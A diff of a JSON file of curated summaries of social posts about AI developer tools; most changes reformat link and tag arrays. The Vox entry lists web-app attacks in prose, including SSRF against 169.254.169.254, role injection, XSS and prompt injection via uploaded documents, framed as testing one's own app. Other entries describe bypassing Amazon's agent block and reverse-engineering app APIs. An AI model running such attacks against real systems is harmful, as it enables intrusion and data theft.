@@ -1059,10 +1059,24 @@
     "engagement": "123 replies · 7 reposts · 132 likes · 78 bookmarks · 6K views",
     "essence": "Day 1 of InstaBox's 28-day 'test in prod' series is the pricing page: one free 4 vCPU / 8 GB machine with no usage limit, plus what Hang Huang calls the most competitive unit price on the market. He credits oversubscription and high utilization for the low cost, and explicitly copies Cloudflare's two principles - free users do QA and force a more intuitive product. 1,000 more invite codes go out; early users keep five free machines until Dec 1, and a Grok bot picks commenters to DM. The 123 replies are almost entirely invite-code begging and use-case pitches (Godot games, agent hosting), with little pricing scrutiny.",
     "summary": "A candid look at pricing dev infra around a generous free tier and utilization economics - useful as a pricing-strategy read, not as independent proof of the 'best unit price' claim.",
-    "productLinks": ["https://instabox.sh/pricing", "https://instabox.sh/blog/instabox-pricing", "https://instabox.sh/"],
-    "topicTags": ["instabox", "cloud-computers", "pricing", "free-tier", "ai-agents"],
+    "productLinks": [
+      "https://instabox.sh/pricing",
+      "https://instabox.sh/blog/instabox-pricing",
+      "https://instabox.sh/"
+    ],
+    "topicTags": [
+      "instabox",
+      "cloud-computers",
+      "pricing",
+      "free-tier",
+      "ai-agents"
+    ],
     "worthFollowUp": "medium",
-    "hasMedia": ""
+    "hasMedia": "",
+    "important": {
+      "note": "InstaBox early users keep five free machines until 1 Dec 2026. Check your machines before then.",
+      "deadline": "2026-12-01"
+    }
   },
   {
     "uid": "X-299",
@@ -1076,8 +1090,16 @@
     "engagement": "932 replies · 28 reposts · 690 likes · 1.2K bookmarks · 70.5K views",
     "essence": "Theo built an SEO assistant on Opus 5.5 that takes a website, finds and applies fixes, identifies real competitors, tracks keywords and rankings, and produces a prioritized weekly action plan. The hook is that the full setup is free: reply 'SEO' and he DMs the template. He spends the thread replying 'here you go' with rerun.build/templates/weekly-seo-action-plan over and over. The 932 replies are mostly people typing 'SEO', plus one substantive question - which specific fix surprised him - that went unanswered.",
     "summary": "The post is a lead magnet, but the linked weekly SEO action-plan template is a genuinely reusable starting point for an agent-driven SEO loop.",
-    "productLinks": ["https://rerun.build/templates/weekly-seo-action-plan"],
-    "topicTags": ["seo", "opus-5-5", "rerun", "automation", "growth"],
+    "productLinks": [
+      "https://rerun.build/templates/weekly-seo-action-plan"
+    ],
+    "topicTags": [
+      "seo",
+      "opus-5-5",
+      "rerun",
+      "automation",
+      "growth"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1093,8 +1115,19 @@
     "engagement": "37 replies · 112 reposts · 1.1K likes · 987 bookmarks · 31.7K views",
     "essence": "Datalab's 1.1 update keeps the 1M-parameter main OCR model and claims 44 pages/s on CPU, within four points of the 3.4B-parameter DeepSeek OCR 2 on OmniParseBench, 15x faster than Tesseract, and support for 80+ languages plus limited handwriting. The --math flag swaps in a larger math model for 12M total parameters. Changes from 1.0 are better language coverage, mostly-English handwriting, and fixes for rotation and layout. Replies ask for Indic languages and Hebrew (Hebrew is not in this version), report skewed pages still failing, and one developer already ported it to WASM and runs it in production.",
     "summary": "A meaningful speed/coverage bump for CPU OCR - best for high-volume ingestion where a tiny model's accuracy ceiling is acceptable.",
-    "productLinks": ["https://huggingface.co/datalab-to/indra-ocr", "https://github.com/datalab-to/indra", "https://www.datalab.to/blog/indra-ocr-1-1", "https://huggingface.co/datasets/datalab-to/omni_parse_bench"],
-    "topicTags": ["ocr", "indra", "datalab", "cpu-inference", "open-models"],
+    "productLinks": [
+      "https://huggingface.co/datalab-to/indra-ocr",
+      "https://github.com/datalab-to/indra",
+      "https://www.datalab.to/blog/indra-ocr-1-1",
+      "https://huggingface.co/datasets/datalab-to/omni_parse_bench"
+    ],
+    "topicTags": [
+      "ocr",
+      "indra",
+      "datalab",
+      "cpu-inference",
+      "open-models"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1110,8 +1143,22 @@
     "engagement": "9 replies · 5 reposts · 128 likes · 312 bookmarks · 13.6K views",
     "essence": "Taras spent a week publishing a chain of seven 'visibility hack' posts, each quoting the previous one: Zapier (REST integration, ~3-day approval), the Official MCP Registry (DNS TXT ownership proof, no review queue, and the list hundreds of directories and clients pull from), the Claude Community directory (needs a two-seat Teams plan at $40/mo and is noindex), Vercel Connectors, Glama (auto-imports registry entries, grades tool descriptions, health-checks listings), Smithery (27,000+ servers, gateway trials, dofollow link) and ClawHub (OpenClaw's skill registry, security-audited, dofollow). The shared prerequisite is a live remote MCP server or API. Replies report Zapier approving in three days, a 403 on Smithery submissions, and skepticism about DR-chasing; Taras says the Claude directory drives the most usage but is only for visibility, while the real win is entity/brand presence across sources AI already trusts.",
     "summary": "One consolidated playbook instead of seven near-identical posts: publish a real MCP server, land the Official Registry first, then cascade to the directories that matter and skip the noindex ones.",
-    "productLinks": ["https://developer.zapier.com/", "https://registry.modelcontextprotocol.io/", "https://claude.ai/directory/manage", "https://vercel.com/connect/browse", "https://glama.ai/", "https://smithery.ai/new", "https://clawhub.ai/"],
-    "topicTags": ["mcp", "directories", "seo", "saas-growth", "backlinks"],
+    "productLinks": [
+      "https://developer.zapier.com/",
+      "https://registry.modelcontextprotocol.io/",
+      "https://claude.ai/directory/manage",
+      "https://vercel.com/connect/browse",
+      "https://glama.ai/",
+      "https://smithery.ai/new",
+      "https://clawhub.ai/"
+    ],
+    "topicTags": [
+      "mcp",
+      "directories",
+      "seo",
+      "saas-growth",
+      "backlinks"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1128,7 +1175,13 @@
     "essence": "Design engineer Flo demos an agent-tree UI component that visualizes parent/child agent relationships - who started whom. The 2.7K-like reaction is mostly design admiration for his component library, with practical questions about the stack (BaseUI, shadcn, Radix), whether a parent's cost includes its children, and requests to port it to Claude Desktop, t3 code and Supacode. Suggested improvements: keep the parent sticky while scrolling long child lists, and show children that outlive a stopped parent. No code or link is included.",
     "summary": "A strong interaction pattern for agent observability UIs - worth copying the tree idea, but the post is inspiration rather than a usable component.",
     "productLinks": [],
-    "topicTags": ["agent-ui", "observability", "component-design", "subagents", "design"],
+    "topicTags": [
+      "agent-ui",
+      "observability",
+      "component-design",
+      "subagents",
+      "design"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1144,8 +1197,17 @@
     "engagement": "80 replies · 103 reposts · 513 likes · 906 bookmarks · 94.5K views",
     "essence": "Treg launched an open-source AEO toolkit that finds every source an AI cites and the author behind it, then helps get your product into those sources - priced at 1 cent per prompt with no subscription and access to 4,000+ data/services. The repo is superdesigndev/treg, with CloroAI as partner. Replies treat the pricing as the story: 1 cent to 'win a prompt' in ChatGPT, Claude or Gemini versus $50/month minimums elsewhere, and several users say Treg is already part of their SEO workflow. One describes it as an 'AEO agent' rather than another dashboard.",
     "summary": "A cheap, open-source way to inspect and influence the citations AI models actually use - more actionable than most AEO dashboards.",
-    "productLinks": ["https://treg.to/aeo", "https://github.com/superdesigndev/treg"],
-    "topicTags": ["aeo", "ai-search", "citations", "open-source", "treg"],
+    "productLinks": [
+      "https://treg.to/aeo",
+      "https://github.com/superdesigndev/treg"
+    ],
+    "topicTags": [
+      "aeo",
+      "ai-search",
+      "citations",
+      "open-source",
+      "treg"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1161,8 +1223,16 @@
     "engagement": "44 replies · 52 reposts · 997 likes · 631 bookmarks · 35.5K views",
     "essence": "Vercel Labs' agent-browser added 'snapshot --delta', which returns only what changed since the previous snapshot instead of the whole page; the demo shows 73x fewer tokens while filling a form. The thread clarifies that delta state resets between sessions, so for long gaps you should save a baseline and run 'agent-browser diff snapshot --baseline last.txt'. Replies are enthusiastic (Rauch: 'Epic'), but the useful pushback is that 73x is a best-case minimal form, an empty delta is ambiguous between unchanged and never-loaded, and '--full' is worth re-sending after context compaction.",
     "summary": "A concrete token-cost win for repeated agent/browser loops - use a saved baseline for long-running monitors and treat empty deltas with suspicion.",
-    "productLinks": ["https://github.com/vercel-labs/agent-browser"],
-    "topicTags": ["agent-browser", "vercel", "browser-automation", "tokens", "agents"],
+    "productLinks": [
+      "https://github.com/vercel-labs/agent-browser"
+    ],
+    "topicTags": [
+      "agent-browser",
+      "vercel",
+      "browser-automation",
+      "tokens",
+      "agents"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1178,8 +1248,16 @@
     "engagement": "40 replies · 298 reposts · 4K likes · 9.2K bookmarks · 551K views",
     "essence": "Palak posts a bare link to Skill-issue.in, which surfaces and ranks agent skills. The 4K-like, 9.2K-bookmark reaction is out of proportion to the one-line post, and replies supply the context: it overlaps with skills.sh and the wave of skill directories, the site's own design could use the skills it ranks, and the ranking mechanic is the differentiator. Several people ask what it is or which skill is most useful; nobody posts a rigorous comparison.",
     "summary": "A discovery shortcut for the exploding agent-skills ecosystem - useful for browsing, but the ranking methodology isn't explained in the post.",
-    "productLinks": ["https://skill-issue.in/"],
-    "topicTags": ["agent-skills", "directory", "discovery", "ranking", "claude-code"],
+    "productLinks": [
+      "https://skill-issue.in/"
+    ],
+    "topicTags": [
+      "agent-skills",
+      "directory",
+      "discovery",
+      "ranking",
+      "claude-code"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1195,8 +1273,16 @@
     "engagement": "11 replies · 11 reposts · 297 likes · 262 bookmarks · 19.4K views",
     "essence": "Serhat points out that DeepSeek V4.1 Flash is free on OpenCode right now, so you can run a whole team of bots in Kuvo Code at zero cost. Kuvo's bots now hold standups: a lead splits the work and each bot executes its part. He clarifies that Kuvo uses the OpenCode engine, works offline, and does not require an OpenCode account; the recent OpenCode breach affected only Console users. Replies are wary - the breach, aggressive rate limits, model-switch crashes, and questions about Windows/mobile support dominate.",
     "summary": "A free way to experiment with multi-agent 'standup' workflows, with the honest caveat that free-model rate limits and OpenCode's breach are real risks.",
-    "productLinks": ["https://www.notebookcheck.net/OpenCode-hacked-users-urged-to-revoke-their-API-keys.1426957.0.html"],
-    "topicTags": ["deepseek", "opencode", "kuvo", "multi-agent", "free-models"],
+    "productLinks": [
+      "https://www.notebookcheck.net/OpenCode-hacked-users-urged-to-revoke-their-API-keys.1426957.0.html"
+    ],
+    "topicTags": [
+      "deepseek",
+      "opencode",
+      "kuvo",
+      "multi-agent",
+      "free-models"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1212,8 +1298,16 @@
     "engagement": "13 replies · 26 reposts · 488 likes · 398 bookmarks · 34K views",
     "essence": "Supermemory's pitch is a single command - npx supermemory plugins - that adds persistent memory to coding agents, with a console for management. Replies surface the practical issues: copy-pasting the stylized Unicode command from the tweet fails, people want to know if it is open source and how it compares to Hindsight, and one user argues stale memories should decay rather than be related to new ones because they cause drift. The positive replies focus on how hard memory is and how much a one-liner helps.",
     "summary": "A low-friction memory layer worth testing, but the command must be retyped (not copied from the styled text) and memory-decay policy is still an open design question.",
-    "productLinks": ["https://console.supermemory.ai/"],
-    "topicTags": ["agent-memory", "supermemory", "mcp", "context", "claude-code"],
+    "productLinks": [
+      "https://console.supermemory.ai/"
+    ],
+    "topicTags": [
+      "agent-memory",
+      "supermemory",
+      "mcp",
+      "context",
+      "claude-code"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1230,7 +1324,13 @@
     "essence": "The 'REA Reverse Engineering Babysitting Tutorial' is a four-step workflow: install OpenCode, pick the free GLM-5.3-Flash model, paste the prompt shown in the image, and let the agent drive REA (Reverse Engineer Anything). The prompt is a structured operating contract - objective, requirements, decisions, work state - demanding evidence anchors (path/line/address/md5), four-part reports, and strict rules about worktrees, file writes and uploads. Replies are split: a reverse engineer with IDA experience calls it overhyped versus IDA MCP + AI, while others confirm Frida memory hooks work until Zhipu patches the free window. The best tips are to split decompilation into a module inventory then per-module deep dives (context truncation), and to expect queue variability on the free tier.",
     "summary": "A reusable prompt structure for agent-assisted RE, not a magic button - treat the 'no bans' claim skeptically and verify findings against real tooling.",
     "productLinks": [],
-    "topicTags": ["reverse-engineering", "rea", "opencode", "glm-5-3-flash", "prompting"],
+    "topicTags": [
+      "reverse-engineering",
+      "rea",
+      "opencode",
+      "glm-5-3-flash",
+      "prompting"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image"
   },
@@ -1247,7 +1347,13 @@
     "essence": "James suggests buying two domains - yourapp.com and yourappreviews.com - and hosting your own reviews there, so when users ask an LLM for reviews it pulls from a page you control. He calls it a dirty little secret everyone will do within 24 months. Replies are hostile and specific: no evidence is offered, the FTC's 2024 fake-review rule bans company-controlled sites posing as independent reviews (roughly $50k per violation), a new low-authority domain will not outrank Trustpilot/G2, and models can be updated to distrust it. He insists he never suggested fake reviews, only hosting real ones.",
     "summary": "A legally and ethically risky growth hack with no evidence behind it - worth knowing as a dark pattern, not worth copying.",
     "productLinks": [],
-    "topicTags": ["reviews", "seo", "llm-seo", "dark-patterns", "ftc"],
+    "topicTags": [
+      "reviews",
+      "seo",
+      "llm-seo",
+      "dark-patterns",
+      "ftc"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -1263,8 +1369,16 @@
     "engagement": "82 replies · 30 reposts · 330 likes · 291 bookmarks · 48.5K views",
     "essence": "Garry Tan's favorite new-project combo is Capy (agents write the first version) plus Aside (agents handle the DevOps), so the first code and the deploy pipeline happen in one flow. Replies are a mix of enthusiasm and warnings: Cloudflare's primitives are simpler in one account, 'devops is where most weekend projects die', one user claims Capy auto-uploads agent trajectories without consent, and others ask whether the agent handles 2FA or re-auth every run. The most useful counterpoint is that agent-owned deploys can create outages nobody understands.",
     "summary": "An influential endorsement of end-to-end agent building - useful as a workflow pointer, but read the privacy and operability warnings in the replies.",
-    "productLinks": ["https://capy.ai/"],
-    "topicTags": ["capy", "aside", "devops", "agents", "vibe-coding"],
+    "productLinks": [
+      "https://capy.ai/"
+    ],
+    "topicTags": [
+      "capy",
+      "aside",
+      "devops",
+      "agents",
+      "vibe-coding"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1280,8 +1394,17 @@
     "engagement": "60 replies · 52 reposts · 313 likes · 459 bookmarks · 25.1K views",
     "essence": "Mathias Chapelon launches Weespy, a free Chrome extension that shows how any SaaS gets customers: traffic estimates, tech stack, ads, SEO, and what competitors post on X, LinkedIn and Reddit, in one click. The thread walks through installing it, listing competitors, and copying formats that already perform. Replies ask whether traffic estimates come from SimilarWeb, whether it shows abandoned channels, and whether it can tailor social content to an audience - most go unanswered. The launch video itself was made with Opus 5.5 + Remotion.",
     "summary": "A free, fast competitor-research starting point - just treat traffic numbers as estimates and verify anything before betting a strategy on it.",
-    "productLinks": ["https://www.weespy.now/", "https://chromewebstore.google.com/detail/weespy/limgkcnlmkolkkbkjkdoenngpkbhmimh"],
-    "topicTags": ["weespy", "competitor-research", "chrome-extension", "saas-marketing", "ads"],
+    "productLinks": [
+      "https://www.weespy.now/",
+      "https://chromewebstore.google.com/detail/weespy/limgkcnlmkolkkbkjkdoenngpkbhmimh"
+    ],
+    "topicTags": [
+      "weespy",
+      "competitor-research",
+      "chrome-extension",
+      "saas-marketing",
+      "ads"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1297,8 +1420,16 @@
     "engagement": "2 replies · 2 reposts · 18 likes · 10 bookmarks · 1.3K views",
     "essence": "Amazon blocked AI assistants such as Muse, Dots and Instinct from browsing and buying on its site. Maritime pitches a workaround: its Android MCP spins up a persistent Android phone in the cloud, shops on Amazon for the customer, and stays logged in for next time - for $1/month per agent. Replies are sparse; Hunch says it can still use Amazon through a direct connector. The post is a small but clear signal that commerce platforms are starting to fight agent traffic, and infrastructure layers are routing around it.",
     "summary": "A useful data point on the coming agent-vs-commerce-platform access fight - and a reminder that 'persistent logged-in phone' workarounds carry account and ToS risk.",
-    "productLinks": ["https://maritime.sh/"],
-    "topicTags": ["amazon", "ai-agents", "android-mcp", "commerce", "maritime"],
+    "productLinks": [
+      "https://maritime.sh/"
+    ],
+    "topicTags": [
+      "amazon",
+      "ai-agents",
+      "android-mcp",
+      "commerce",
+      "maritime"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1314,8 +1445,17 @@
     "engagement": "67 replies · 49 reposts · 823 likes · 671 bookmarks · 135.6K views",
     "essence": "Leo benchmarked S3, Cloudflare R2, Railway Buckets, Backblaze B2 and Neon Object Storage from six locations using the Files SDK for fairness. Railway was fastest on time-to-first-byte and 100 MB downloads from every location; R2 was fastest for 1 MB uploads overall but slowest from Virginia; Railway was also cheapest, while S3 and Neon were expensive. The benchmark code and site are open source. Replies congratulate Neon on being both slowest and most expensive, note that Railway's S3 is Tigris under the hood, and ask for Tigris itself to be tested.",
     "summary": "Rare public, reproducible storage numbers - Railway/Tigris look like the value pick, but rerun the benchmark for your own regions and file sizes.",
-    "productLinks": ["https://github.com/opencoredev/storage-bench", "https://storage-bench.vercel.app/"],
-    "topicTags": ["object-storage", "benchmark", "railway", "cloudflare-r2", "s3"],
+    "productLinks": [
+      "https://github.com/opencoredev/storage-bench",
+      "https://storage-bench.vercel.app/"
+    ],
+    "topicTags": [
+      "object-storage",
+      "benchmark",
+      "railway",
+      "cloudflare-r2",
+      "s3"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1332,7 +1472,13 @@
     "essence": "Dara's AGENTS.md section tells agents: walk through two-way doors and show me after; stop at one-way doors. If the answer would be a rubber stamp, don't ask; if running something can answer the question, run it. Save questions for taste and product calls only, one at a time, with a recommendation, and 'no' is acceptable. Once a one-way door is opened it stays open for that work, including subagents, and the agent should return only if the door turns out different (more at stake, a check failing, something unknown). Replies focus on how much decision fatigue this removes and debate whether harnesses can be trusted with that autonomy.",
     "summary": "A compact, copy-pasteable autonomy contract that trades permission-seeking for stated reversibility - the best AGENTS.md snippet in this batch.",
     "productLinks": [],
-    "topicTags": ["agents-md", "autonomy", "claude-code", "workflow", "decision-making"],
+    "topicTags": [
+      "agents-md",
+      "autonomy",
+      "claude-code",
+      "workflow",
+      "decision-making"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "image"
   },
@@ -1349,7 +1495,13 @@
     "essence": "Vox turns a vibe-coded app's pre-launch security review into a concrete red-team script: three subagents with three accounts (A, B, admin) run 14 attacks across impersonation, limit bypass and outside access, collect proof, then fix everything in one pass. The attacks are specific - query every table with the public key, swap A's id for B's, inject role: admin into a profile update, reuse a password-reset link, call APIs past the UI and credit limits, test open redirects with // and @, XSS in usernames and Markdown, SSRF against localhost and 169.254.169.254, cache leakage between accounts, unauthenticated preview links, and prompt injection through uploaded documents. Every item must actually run, and a fix only counts if the attack succeeds with protection off and fails with it on. The replies are a warning label: several users say this pattern gets Claude accounts flagged or downgraded, and recommend local models instead.",
     "summary": "A reusable, unusually concrete security checklist for agent-built apps - but run it against your own test environment, not a production account you care about.",
     "productLinks": [],
-    "topicTags": ["security", "red-teaming", "claude-code", "subagents", "vibe-coding"],
+    "topicTags": [
+      "security",
+      "red-teaming",
+      "claude-code",
+      "subagents",
+      "vibe-coding"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1365,8 +1517,17 @@
     "engagement": "52 replies · 37 reposts · 603 likes · 783 bookmarks · 70.1K views",
     "essence": "Pranav Patel launches Reloop, an open-source email platform positioned as a cheaper Resend: 100K emails for $20/month instead of $90, free to 3,000, with an email API, SMTP relay, inboxes for AI agents, automations, deliverability guardrails, bring-your-own-SMTP and inbound email. It is agentic (the whole UI is available to an AI) and self-hostable. The 'I reverse engineered Resend' framing is what the thread fights about: the top reply says vibe-coding a clone is not reverse engineering and that open-source Resend alternatives have existed for years, another says the price matches Resend without its reliability, and others ask how much was him versus a model. Patel answers that the architecture and decisions are his, that Reloop is not an AWS wrapper, and links a PR adding it to the opencoredev email SDK.",
     "summary": "A credible cheap Resend alternative if deliverability holds up - the launch is also a case study in how 'reverse engineered' framing invites credit and reliability scrutiny.",
-    "productLinks": ["https://reloop.sh/", "https://github.com/opencoredev/email-sdk/pull/261"],
-    "topicTags": ["email", "resend", "open-source", "smtp", "deliverability"],
+    "productLinks": [
+      "https://reloop.sh/",
+      "https://github.com/opencoredev/email-sdk/pull/261"
+    ],
+    "topicTags": [
+      "email",
+      "resend",
+      "open-source",
+      "smtp",
+      "deliverability"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1382,8 +1543,16 @@
     "engagement": "147 replies · 173 reposts · 2.9K likes · 3.4K bookmarks · 159.2K views",
     "essence": "Leon Lin's earshot is an MCP server and skill that lets a coding agent describe, match and find sound effects, render a visual page of a soundtrack, and critique audio with scores plus timestamped fixes - all locally on CPU. Earshot Forge goes further: the agent writes code to synthesize a sound, listens to it, scores it, rewrites the code and repeats until it is decent, comparing against real recordings because blind tests mislead. Lin's own blind test of 15 real-vs-generated pairs got 8 right, essentially a coin flip, which he admits. Setup is one command: claude mcp add earshot -- python -m earshot mcp. The launch video's entire soundtrack was made in code, but the top replies are blunt that it still sounds like sloppy Claude sound design, which is the problem the tool is meant to fix.",
     "summary": "A genuinely new modality for coding agents - audio QA and synthesis in one loop - though the demos show taste is still the bottleneck, not generation.",
-    "productLinks": ["https://github.com/Leonxlnx/earshot"],
-    "topicTags": ["audio", "mcp", "sound-design", "claude-code", "generative-audio"],
+    "productLinks": [
+      "https://github.com/Leonxlnx/earshot"
+    ],
+    "topicTags": [
+      "audio",
+      "mcp",
+      "sound-design",
+      "claude-code",
+      "generative-audio"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1400,7 +1569,13 @@
     "essence": "OpenDesign Motion is an open-source alternative to Claude Motion that decouples motion-video generation from one model: any agent and any model can drive it, and the launch video itself was made in OpenDesign. The thread is a demo reel for DeepSeek V4.1 Flash, showing tutorial-style motion graphics, a self-made launch video and multiple demos made without Opus 5.5. The author says it renders locally and new users get free trial credits. Replies split between people wanting to try it and motion designers unimpressed by the output - 'fast cuts with colourful distractions' that ignore motion-graphics principles - which is the same taste gap that shows up in every code-generated video launch.",
     "summary": "The interesting claim is model independence and local rendering, not the demo quality; treat it as an option to test against Claude Motion rather than a drop-in upgrade.",
     "productLinks": [],
-    "topicTags": ["motion-design", "video", "open-source", "deepseek", "agents"],
+    "topicTags": [
+      "motion-design",
+      "video",
+      "open-source",
+      "deepseek",
+      "agents"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1416,8 +1591,17 @@
     "engagement": "40 replies · 28 reposts · 307 likes · 325 bookmarks · 37.8K views",
     "essence": "Rakesh K launched sys0.in, an interactive way to learn systems programming, and the reply section turned into a plagiarism trial. Multiple replies accuse him of taking the open-source breakscale.tech, adding a paywall and charging around ₹4,000; one calls it '1:1 cloning' and another says big creators are copying college students' open-source work. Rakesh denies it and tells critics to try the free lessons and lab before concluding, while defenders say the step-by-step labs are original and the free tier is real. The launch itself is thin - a link and 'try interacting with it' - so the durable signal is the accusation pattern, not the product detail.",
     "summary": "A launch buried by a copying scandal: useful as a reminder to document provenance and licensing before monetizing an educational product, whatever the truth here.",
-    "productLinks": ["https://sys0.in/", "https://breakscale.tech/"],
-    "topicTags": ["systems-programming", "education", "plagiarism", "open-source", "launch"],
+    "productLinks": [
+      "https://sys0.in/",
+      "https://breakscale.tech/"
+    ],
+    "topicTags": [
+      "systems-programming",
+      "education",
+      "plagiarism",
+      "open-source",
+      "launch"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -1433,8 +1617,16 @@
     "engagement": "25 replies · 20 reposts · 232 likes · 166 bookmarks · 15.4K views",
     "essence": "DreamScale Labs launched a hosted way to run physical-AI models on robots through a single sentence - 'I want to run a <model> on a <robot> to <do something>' - with no GPU and real-time inference over the cloud. It starts with MolmoAct2, pi0.5 and Flux 3 Action, and the simulator runs in the browser while making cloud inference calls. The pitch is that model/robot/task combinations are too confusing to evaluate, so the UI collapses them into one prompt. Replies immediately hit the two hard questions: how do you evaluate model quality across different robots, and whether cloud inference can survive packet loss and latency in safety-critical physical systems. Neither got a concrete answer in the thread.",
     "summary": "A clean interface over a genuinely messy problem; the missing evaluation and latency story is what determines whether it is a demo or infrastructure.",
-    "productLinks": ["https://www.dreamscalelabs.com/"],
-    "topicTags": ["robotics", "physical-ai", "cloud-inference", "simulation", "vla-models"],
+    "productLinks": [
+      "https://www.dreamscalelabs.com/"
+    ],
+    "topicTags": [
+      "robotics",
+      "physical-ai",
+      "cloud-inference",
+      "simulation",
+      "vla-models"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1451,7 +1643,13 @@
     "essence": "Vijay asked Codex to reverse engineer an Android quick-commerce price-comparison app, pulled its backend endpoints with the REA skill, and built a whey-protein price-alert bot. It paid off immediately: 2 kg for ₹3,993 on Instamart when the going rate was ₹3,200+ for 1 kg. He says the bot polls twice a day, that proxies are the real operational headache because sites block scrapers, and that the whole thing is easy enough to vibe-code now. Replies ask for the repo, the polling rate and which whey; the more useful skepticism is that reverse-engineering works when the target API is clean but falls apart on messy DOMs, and that IP/account blocking is the part nobody demos.",
     "summary": "A small, concrete example of agent-built scraping economics - the win is the endpoint discovery, the hidden cost is proxies and anti-bot maintenance.",
     "productLinks": [],
-    "topicTags": ["codex", "scraping", "price-tracking", "reverse-engineering", "quick-commerce"],
+    "topicTags": [
+      "codex",
+      "scraping",
+      "price-tracking",
+      "reverse-engineering",
+      "quick-commerce"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1467,8 +1665,16 @@
     "engagement": "138 replies · 167 reposts · 2.1K likes · 3.6K bookmarks · 440.4K views",
     "essence": "Shipper released epstein.md, a 927,400+ character markdown file meant to stop vibe-coded UI from looking like AI slop: no box shadows, no emojis, no green 'LIVE' badges, zero blue-purple gradients, and a blocklist of 350 overused AI words (delve, vibe, seamless). It is the product of 11 months of eight-hour doomscrolling and continuous additions to their own vibecoder, and it is integrated into shipper.now. The reaction is split between people who want the file and people dunking on the name and on the launch video, which itself uses checkmark emojis and looks like the slop it claims to ban. Several replies are simply 'what .md?' - the post never links the file directly, which blunts the distribution.",
     "summary": "A memorable anti-slop ruleset with a self-inflicted naming and packaging problem; the content may be useful, but the launch is a case study in how a joke name can overshadow the artifact.",
-    "productLinks": ["https://shipper.now/"],
-    "topicTags": ["design", "ai-slop", "markdown", "prompts", "frontend"],
+    "productLinks": [
+      "https://shipper.now/"
+    ],
+    "topicTags": [
+      "design",
+      "ai-slop",
+      "markdown",
+      "prompts",
+      "frontend"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1484,8 +1690,16 @@
     "engagement": "18 replies · 15 reposts · 216 likes · 308 bookmarks · 18.7K views",
     "essence": "Kevin Miao pitches Bryel Foundry as model training reduced to one prompt: give it a teacher model and a domain, and within seven days you get a custom model up to 2x cheaper in that domain. The proof point is Coinbase's 9B model, which reportedly beat frontier models in its domain while being 55% faster and costing under $100 to train. Bryel says it has used the same tooling to train models for unicorns and is now opening it to outside teams, with a demo booking link. Replies are interested but probe the obvious weak spot - whether a model trained this way holds up on messy, unseen data - and Miao answers that the harder problem is keeping up as real-world inputs evolve, which is why continuous retraining matters.",
     "summary": "Model training as a service is getting cheap enough to try; the claim to verify is out-of-distribution robustness, not the headline training cost.",
-    "productLinks": ["https://www.bryel.ai/"],
-    "topicTags": ["model-training", "distillation", "custom-models", "bryel", "cost"],
+    "productLinks": [
+      "https://www.bryel.ai/"
+    ],
+    "topicTags": [
+      "model-training",
+      "distillation",
+      "custom-models",
+      "bryel",
+      "cost"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1501,8 +1715,17 @@
     "engagement": "94 replies · 279 reposts · 4.6K likes · 8.7K bookmarks · 542K views",
     "essence": "Leon Lin rebuilt TasteSkill from scratch: v2 reads a brief, writes down what is specific to that client, has a script choose three directions from twenty it researched, and then makes the agent gather real photos, maps and other assets with credits before building. A browser check verifies the result instead of trusting the model's self-report. The install is npx skills add Leonxlnx/taste-skill, and the repo includes example credits. Lin is candid that it is 'just some markdown files' and cannot solve general design taste, and the replies bear that out - some call it their go-to skill, others say the showcased outputs still look like AI slop. The launch video was itself coded with Cinetic and Opus 5.5.",
     "summary": "The strongest part is the workflow - research, constrained direction choice, real assets, browser verification - not a promise that markdown can replace a designer.",
-    "productLinks": ["https://github.com/Leonxlnx/taste-skill", "https://github.com/Leonxlnx/taste-skill/blob/main/examples/v2/CREDITS.md"],
-    "topicTags": ["design", "claude-code", "skills", "frontend", "taste"],
+    "productLinks": [
+      "https://github.com/Leonxlnx/taste-skill",
+      "https://github.com/Leonxlnx/taste-skill/blob/main/examples/v2/CREDITS.md"
+    ],
+    "topicTags": [
+      "design",
+      "claude-code",
+      "skills",
+      "frontend",
+      "taste"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -1518,8 +1741,16 @@
     "engagement": "23 replies · 9 reposts · 341 likes · 331 bookmarks · 13.1K views",
     "essence": "Arlan Marat published a new design system aimed specifically at AI apps and developer tools, with copyable code at design.how/systems. The post is deliberately minimal - a link and 'new design system' - but the replies show the niche it fills: people are tired of agents 'creatively reinterpreting' a palette into six shades of purple, and a constrained system gives them something concrete to build against. Marat says his own agent came up with it, which is either a useful signal about agent-generated design systems or a warning about how little human curation is behind it, depending on your priors.",
     "summary": "A lightweight, copy-paste starting point for AI-product UI; the value is constraint and speed, not originality.",
-    "productLinks": ["https://design.how/systems"],
-    "topicTags": ["design-system", "ui", "ai-products", "dev-tools", "frontend"],
+    "productLinks": [
+      "https://design.how/systems"
+    ],
+    "topicTags": [
+      "design-system",
+      "ui",
+      "ai-products",
+      "dev-tools",
+      "frontend"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -1535,8 +1766,17 @@
